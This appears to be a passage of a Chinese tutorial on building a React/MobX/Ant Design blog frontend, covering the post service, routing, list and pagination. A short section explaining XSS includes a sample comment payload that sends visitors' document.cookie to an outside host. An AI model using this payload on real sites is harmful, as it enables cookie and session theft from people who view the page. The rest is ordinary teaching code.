            url:<span style="color: #8b2252;">'/gettoken'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#33719;&#21462;token'</span>, Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>))
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
    getPost(id) {
        axios.get({url:<span style="color: #8b2252;">'/posts/'</span>+id}).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;'</span>, value);
                <span style="color: #008b8b;">this</span>.post = value.post || {} ;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">postService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">PostService</span>();
<span style="color: #a020f0;">export</span> {postService}
</pre>
</div>

<p>
数据详情页，可参考：<a href="https://ant.design/components/descriptions-cn">https://ant.design/components/descriptions-cn</a>
</p>
</div>
</div>
</div>
<div id="outline-container-h:dd23a3fc-d76b-4b5a-a610-27caf60d5b8a" class="outline-4">
<h4 id="h:dd23a3fc-d76b-4b5a-a610-27caf60d5b8a">XSS</h4>
<div class="outline-text-4" id="text-h:dd23a3fc-d76b-4b5a-a610-27caf60d5b8a">
<p>
跨站脚本攻击(Cross Site Scripting)，缩写为XSS
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">div</span>&gt;&#36825;&#26159;&#19968;&#27573;&#27979;&#35797;&#33050;&#26412;,&#21253;&#21547;&#19968;&#20010;&#24377;&#20986;&#26694;&#30340;&#25191;&#34892;
&lt;<span style="color: #0000ff;">script</span>&gt;function a(){alert(1)} a()&lt;/<span style="color: #0000ff;">script</span>&gt;
&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">click</span>=<span style="color: #8b2252;">"alert('xss hrefago')"</span>&gt;&#36825;&#26159;&#19968;&#20010;&#38142;&#25509;&#35302;&#21457;&#30340;&#33050;&#26412;&lt;/<span style="color: #0000ff;">div</span>&gt;
&lt;<span style="color: #0000ff;">script</span>&gt;document.write('&lt;<span style="color: #0000ff;">img</span> <span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"http://www.hadtker.com/grabbe.jsp?msg="'+ document.cookie +'</span> width=16 height=16 border=0 /&gt;');&lt;/<span style="color: #0000ff;">script</span>&gt;
&lt;/<span style="color: #0000ff;">div</span>&gt;
</pre>
</div>

<p>
在一个没有考虑XSS的网站，把上面的内容写入评论区提交后台，如果他人打开网页，评论区显示这段内容，就会执行脚本，设置无意的一个操作就触发了脚本代码并悄悄收集用户信息。例如评论中有一个好玩的图片。
</p>
</div>
</div>
<div id="outline-container-h:a93bce79-d7d3-41e3-ad48-c71a5dae312a" class="outline-4">
<h4 id="h:a93bce79-d7d3-41e3-ad48-c71a5dae312a">文章列表页组件</h4>
<div class="outline-text-4" id="text-h:a93bce79-d7d3-41e3-ad48-c71a5dae312a">
<ul class="org-ul">
<li>列表： <a href="https://ant.design/components/list-cn">https://ant.design/components/list-cn</a></li>
</ul>

<p>
创建component/list.js,创建List组件。在index.js中提交菜单项和路由。
</p>

<p>
注意List，小心和AntD的List冲突。
</p>

<p>
修改src/index.js文件
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> { BrowserRouter as Router, Switch, Route, Link } from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;
<span style="color: #a020f0;">import</span> Pub from <span style="color: #8b2252;">'./component/pub'</span>;

<span style="color: #a020f0;">import</span> { Menu, Icon, Layout } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> Profile from <span style="color: #8b2252;">'./component/profile'</span>;
<span style="color: #a020f0;">import</span> Detail from <span style="color: #8b2252;">'./component/detail'</span>;
<span style="color: #a020f0;">import</span> List from <span style="color: #8b2252;">'./component/list'</span>;
<span style="color: #a020f0;">const</span> { Header, Content, Footer } = Layout;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">blog &#169;2008 Created by Jasper</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    current: <span style="color: #8b2252;">'home'</span>,
  };

  handleClick = e =&gt; {
    console.log(<span style="color: #8b2252;">'click '</span>, e);
    <span style="color: #008b8b;">this</span>.setState({
      current: e.key,
    });
  };
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">Layout</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"layout"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick}
            <span style="color: #a0522d;">theme</span>=<span style="color: #8b2252;">"dark"</span>
            <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"horizontal"</span>
            <span style="color: #a0522d;">defaultSelectedKeys</span>={[<span style="color: #008b8b;">this</span>.state.current]}
            <span style="color: #a0522d;">style</span>={{ lineHeight: <span style="color: #8b2252;">'64px'</span> }}
          <span style="color: #b22222;">// </span><span style="color: #a0522d;">selectedKeys</span><span style="color: #b22222;">={[this.state.current]}</span>
          &gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"home"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"home"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"login"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"login"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"reg"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"form"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"pub"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/pub"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"edit"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20889;&#21338;&#23458;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"list"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/list"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"bars"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#21338;&#23458;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"about"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">Menu</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Content</span> <span style="color: #a0522d;">style</span>={{ padding: <span style="color: #8b2252;">'10px 50px'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">style</span>={{ background: <span style="color: #8b2252;">'#fff'</span>, padding: 24, minHeight: 280 }}&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/pub"</span> <span style="color: #a0522d;">component</span>={Pub}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/list"</span> <span style="color: #a0522d;">component</span>={List}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/posts/:id"</span> <span style="color: #a0522d;">component</span>={Detail}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Content</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Footer</span> <span style="color: #a0522d;">style</span>={{ textAlign: <span style="color: #8b2252;">'center'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Footer</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">Layout</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>


<p>
service/post.js 增加服务层列表方法list()
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/post.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> Cookies from <span style="color: #8b2252;">'js-cookie'</span>;

<span style="color: #a020f0;">class</span> PostService {
    @observable success = <span style="color: #008b8b;">false</span>;
    @observable post = {};
    @observable posts = {}; <span style="color: #b22222;">// </span><span style="color: #b22222;">2&#20010;&#23545;&#35937; posts pagination</span>

    pub(title, content) {
        console.log(<span style="color: #8b2252;">'&#21435;&#22788;&#29702;'</span>, title, content); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/posts/'</span>,
            data:{title, content},
            config: {
                headers: {<span style="color: #8b2252;">'X-CSRFToken'</span>: Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>)} <span style="color: #b22222;">// </span><span style="color: #b22222;">&#26412;&#22495; HTTP_X_CSRFTOKEN</span>
            }
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                message.info(<span style="color: #8b2252;">'&#21338;&#25991;&#25552;&#20132;&#25104;&#21151;'</span>);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22686;&#24378;&#65292;&#30830;&#35748;&#26159;&#21542;&#36339;&#36716;</span>
                <span style="color: #008b8b;">this</span>.success = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }

    getToken() {
        axios.get({
            url:<span style="color: #8b2252;">'/gettoken'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#33719;&#21462;token'</span>, Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>))
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
    getPost(id) {
        axios.get({url:<span style="color: #8b2252;">'/posts/'</span>+id}).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;'</span>, value);
                <span style="color: #008b8b;">this</span>.post = value.post || {} ;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }

    list() {
        axios.get({url:<span style="color: #8b2252;">'/posts/'</span>}).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;'</span>, value);
                <span style="color: #008b8b;">this</span>.posts = value || {} ;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">postService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">PostService</span>();
<span style="color: #a020f0;">export</span> {postService}
</pre>
</div>
</div>
<div id="outline-container-h:a9a795d3-034b-41d6-a5a3-ef0f6ba989f1" class="outline-5">
<h5 id="h:a9a795d3-034b-41d6-a5a3-ef0f6ba989f1">List组件</h5>
<div class="outline-text-5" id="text-h:a9a795d3-034b-41d6-a5a3-ef0f6ba989f1">
<p>
component/list.js 列表组件
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/list.js</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Card, Col, Empty, Row } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> { List, Typography } from <span style="color: #8b2252;">'antd'</span>;

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> L <span style="color: #a020f0;">extends</span> React.Component { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#32570;&#30465;&#23548;&#20986;&#65292;&#25913;&#20160;&#20040;&#21517;&#23383;&#37117;&#21487;&#20197;</span>
    constructor(props) {
        <span style="color: #a020f0;">super</span>(props);
        console.log(props); <span style="color: #b22222;">// </span><span style="color: #b22222;">props&#24050;&#32463;&#34987;react react-router&#25913;&#36807;&#20102;</span>
        props.service.list();
    }

    render() {
        console.log(<span style="color: #8b2252;">'list render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> {posts:data=[], pagination={}}} = <span style="color: #008b8b;">this</span>.props.service.posts;
        console.log(data.length);
        console.log(pagination);
        <span style="color: #a020f0;">return</span> (
    &lt;<span style="color: #0000ff;">List</span>
      <span style="color: #a0522d;">header</span>={&lt;<span style="color: #0000ff;">div</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#21338;&#23458;&#21015;&#34920;</span>&lt;/<span style="color: #0000ff;">div</span>&gt;}
      <span style="color: #a0522d;">footer</span>={&lt;<span style="color: #0000ff;">div</span>&gt;<span style="color: #000000; background-color: #ffffff;">Footer</span>&lt;/<span style="color: #0000ff;">div</span>&gt;}
      <span style="color: #a0522d;">bordered</span>
      <span style="color: #a0522d;">dataSource</span>={data}
      <span style="color: #a0522d;">renderItem</span>={(item) =&gt; (
        &lt;<span style="color: #0000ff;">List.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>={<span style="color: #8b2252;">'/posts/'</span> + item.id} &gt;{item.title}&lt;/<span style="color: #0000ff;">Link</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">List.Item</span>&gt;
      )}
    /&gt;
        );
    }
}
</pre>
</div>


<p>
List列表组件
</p>
<ul class="org-ul">
<li>bordered有边线</li>
<li>dataSource给定数据源</li>
<li>renderItem渲染每一行，给定一个一参函数迭代每一行</li>
<li>List.Item每一行的组件</li>
</ul>

<p>
使用Link组件增加链接
</p>

<div class="org-src-container">
<pre class="src src-js">&lt;List bordered dataSource = {data} 
    renderItem={item =&gt; (
        &lt;List.Item&gt;
            &lt;Link to={<span style="color: #8b2252;">'/posts/'</span>+item.id}&gt;{item.title}&lt;/Link&gt;
        &lt;/List.Item&gt;
    )}
<span style="color: #8b2252;">/&gt;</span>
</pre>
</div>

<p>
如果需要根据复杂的效果可以使用List.Item.Meta。
</p>

<ul class="org-ul">
<li>测试<a href="http://localhost:3000/list">http://localhost:3000/list</a></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:43383cb6-c4a9-467e-b738-1611d61e8faf" class="outline-4">
<h4 id="h:43383cb6-c4a9-467e-b738-1611d61e8faf">分页功能</h4>
<div class="outline-text-4" id="text-h:43383cb6-c4a9-467e-b738-1611d61e8faf">
<p>
Pagination分页组件 <a href="https://ant.design/components/pagination-cn">https://ant.design/components/pagination-cn</a>
</p>

<p>
分页使用了Pagination组件，在L组件的render函数的List组件中使用pagination属性，这个属性放入一个pagination对象，有如下属性
</p>
<ul class="org-ul">
<li>current，当前页</li>
<li>pageSize, 页面内行数</li>
<li>total,记录总数</li>
<li>onChange,页码切换时调用，回调函数为=(pageNo,pageSize)=&gt;{}=,即切换是获得当前页码和页内行数。</li>
</ul>

<p>
可参考<a href="https://ant.design/components/list-cn/#components-list-demo-vertical">https://ant.design/components/list-cn/#components-list-demo-vertical</a>
</p>

<p>
查询字符串处理 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams">https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams</a>
</p>

<ul class="org-ul">
<li>方法1 查询参数处理</li>
</ul>
<div class="org-src-container">
<pre class="src src-js">    props.service.list(props.localtion.search);

list(qstr) {
    axios.get({url:<span style="color: #8b2252;">'/posts/'</span> + qstr}).then(
</pre>
</div>

<ul class="org-ul">
<li>方法2 查询参数处理</li>
</ul>
<div class="org-src-container">
<pre class="src src-js">    <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">params</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">URLSearchParams</span>(props.location.search);
    props.service.list(params);

list(params) {
    axios.get({
        url:<span style="color: #8b2252;">'/posts/'</span>,
        config:{
            <span style="color: #8b2252;">'params'</span>:params
        }
    }).then(
</pre>
</div>

<p>
修改component/list.js代码如下：
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/list.js</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Card, Col, Empty, Row } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> { List, Typography } from <span style="color: #8b2252;">'antd'</span>;

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> L <span style="color: #a020f0;">extends</span> React.Component { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#32570;&#30465;&#23548;&#20986;&#65292;&#25913;&#20160;&#20040;&#21517;&#23383;&#37117;&#21487;&#20197;</span>
    constructor(props) {
        <span style="color: #a020f0;">super</span>(props);
        console.log(props); <span style="color: #b22222;">// </span><span style="color: #b22222;">props&#24050;&#32463;&#34987;react react-router&#25913;&#36807;&#20102;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
        <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">params</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">URLSearchParams</span>(props.location.search);
        props.service.list(params);
        <span style="color: #b22222;">// </span><span style="color: #b22222;">props.service.list(props.localtion.search);</span>
    }

    render() {
        console.log(<span style="color: #8b2252;">'list render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> { posts: data = [], pagination = {} } = <span style="color: #008b8b;">this</span>.props.service.posts;
        <span style="color: #a020f0;">const</span> { page: current = 1, size: pageSize = 20, total } = pagination

        console.log(data.length);
        console.log(pagination);

        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">List</span>
                <span style="color: #a0522d;">header</span>={&lt;<span style="color: #0000ff;">div</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#21338;&#23458;&#21015;&#34920;</span>&lt;/<span style="color: #0000ff;">div</span>&gt;}
                <span style="color: #a0522d;">bordered</span>
                <span style="color: #a0522d;">dataSource</span>={data}
                <span style="color: #a0522d;">renderItem</span>={(item) =&gt; (
                    &lt;<span style="color: #0000ff;">List.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>={<span style="color: #8b2252;">'/posts/'</span> + item.id} &gt;{item.title}&lt;/<span style="color: #0000ff;">Link</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">List.Item</span>&gt;
                )}
                <span style="color: #a0522d;">pagination</span>={{
                    onChange: page =&gt; {
                        console.log(page);
                        <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">params</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">URLSearchParams</span>(<span style="color: #008b8b;">this</span>.props.location.search);
                        params.set(<span style="color: #8b2252;">'page'</span>, page);
                        <span style="color: #008b8b;">this</span>.props.service.list(params);
                    },
                    defaultCurrent:1,
                    current,
                    pageSize,
                    total
                }}
            /&gt;
        );
    }
}
</pre>
</div>


<p>
修改service/post.js中的list方法
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/post.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> Cookies from <span style="color: #8b2252;">'js-cookie'</span>;

<span style="color: #a020f0;">class</span> PostService {
    @observable success = <span style="color: #008b8b;">false</span>;
    @observable post = {};
    @observable posts = {}; <span style="color: #b22222;">// </span><span style="color: #b22222;">2&#20010;&#23545;&#35937; posts pagination</span>

    pub(title, content) {
        console.log(<span style="color: #8b2252;">'&#21435;&#22788;&#29702;'</span>, title, content); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/posts/'</span>,
            data:{title, content},
            config: {
                headers: {<span style="color: #8b2252;">'X-CSRFToken'</span>: Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>)} <span style="color: #b22222;">// </span><span style="color: #b22222;">&#26412;&#22495; HTTP_X_CSRFTOKEN</span>
            }
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
